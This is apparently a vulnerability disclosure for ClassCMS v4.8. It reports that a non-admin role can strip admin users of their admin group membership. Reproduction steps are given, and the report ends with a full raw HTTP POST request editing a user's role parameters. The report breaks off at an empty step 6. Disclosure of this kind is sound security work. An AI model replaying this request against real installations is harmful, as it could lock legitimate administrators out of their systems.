# Vertical Privilege Escalation Vulnerability Report

## Description
A privilege escalation vulnerability exists in the model management module of Classcms. This allows accounts belonging to non-admin user groups to modify admin group users and change their group memberships to other user groups. If all users in the admin group are changed to other groups, the system will no longer have the ability to configure accounts for the admin group.

## Download URL
[https://github.com/ClassCMS/ClassCMS/releases/tag/v4.8](https://github.com/ClassCMS/ClassCMS/releases/tag/v4.8)

## Version
V4.8

## Tested Environment
- PHP
- Apache
- MySQL

## Affected Page
`/index.php/admin`

## Vulnerability Details
In the user management page, the username, hash, and rolehash[0] parameters are vulnerable to vertical privilege escalation. Accounts with non-admin permissions can modify the roles of members in the admin user group, even though they cannot view admin users. While the system prevents non-admin users from elevating their own roles to the admin group, it fails to account for vertical privilege escalation that allows non-admin users to downgrade the permissions of admin group members. This oversight can result in a scenario where admin users lose their admin group membership, effectively locking all admin users out of the admin group.

## Steps to Reproduce

1. To test this vulnerability, you need two roles: the default admin role and a custom aaa role with permissions for "Modify User Account" in User Management and access to Role Management. The setup should look as shown in the figure:
![image](https://github.com/user-attachments/assets/21785bd1-9e0e-4001-bb67-4ccd45c23428)
2.Log in to the backend, then click on User Management, followed by Roles, and then click Add Role. Create the aaa role and assign it only the permissions for Role Management and Modify User Account.
![image](https://github.com/user-attachments/assets/210caa40-1cee-4e46-9cb2-eae1da2b41bc)
![image](https://github.com/user-attachments/assets/36b79a44-8595-4670-a2e8-52b8e04e3e28)
![image](https://github.com/user-attachments/assets/486f5d1a-8cb2-4336-8bb5-2cf06f3340d1)
![image](https://github.com/user-attachments/assets/62709bc4-8904-40eb-95be-a237d8929c42)
3.Add a user a and assign the aaa role to them.
![image](https://github.com/user-attachments/assets/4ae05941-9ce0-44b7-9e27-6c3addf23355)
4.Log in as user a and notice that the interface is empty.
![image](https://github.com/user-attachments/assets/2e9dc7c1-8f16-4aaa-8ea3-18ef40a2ad9a)
5.Below is the complete structure of the data packet:

```http
POST /admin?do=admin:user:editPost HTTP/1.1
Host: 10.0.93.90
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://10.0.93.90/admin?do=admin:user:edit&id=2
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 90
Origin: http://10.0.93.90
Connection: close
Cookie: token_672065=c09db2a11c209391046dc7c4c9d83053; csrf_672065=179ab53e; token_c075a1=918201e1160a21fbf851ec06b7abce41; csrf_c075a1=2963664c; token_da3622=36a824c20e91a443ff207e1e15b82ffd; csrf_da3622=f5c8ede5; token_595ef5=314802c11146c95fad9ea45f332ad7ee; csrf_595ef5=04da0bce

username=a&hash=a&enabled=on&rolehash%5B0%5D=admin&passwd=&passwd_2=b&csrf_595ef5=04da0bce```

6.


